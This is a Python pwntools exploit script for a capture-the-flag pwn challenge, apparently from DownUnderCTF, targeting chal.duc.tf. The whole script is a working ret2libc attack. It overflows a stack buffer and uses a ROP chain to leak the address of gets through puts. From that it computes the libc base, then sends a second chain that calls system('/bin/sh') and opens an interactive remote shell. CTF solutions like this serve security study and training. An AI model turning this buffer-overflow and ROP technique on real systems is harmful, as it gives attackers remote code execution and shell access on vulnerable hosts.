#!/bin/python3

from pwn import *

ret = p64(0x401016)
poprdi = p64(0x40122b)
gets_GOT = p64(0x404020)
puts_plt = p64(0x401030)
main_addr = p64(0x4011ad)

leak_base_payload = b"A"*56 + ret + poprdi + gets_GOT + puts_plt + main_addr

p = remote("chal.duc.tf", 30003)
p.sendline(leak_base_payload)
address = p.recvline()
address = address[0:6]

gets_addr = int.from_bytes(address, byteorder='little')
gets_offset = 0x80120
libc_base = gets_addr - gets_offset

system_offset = 0x4f40fa
system_addr = libc_base + system_offset
system = p64(system_addr)
binsh_offset = 0x1b40fa
binsh_addr = libc_base + binsh_offset
binsh = p64(binsh_addr)

shell_payload = b"A"*56 + poprdi + binsh + system

p.sendline(shell_payload)
p.interactive()
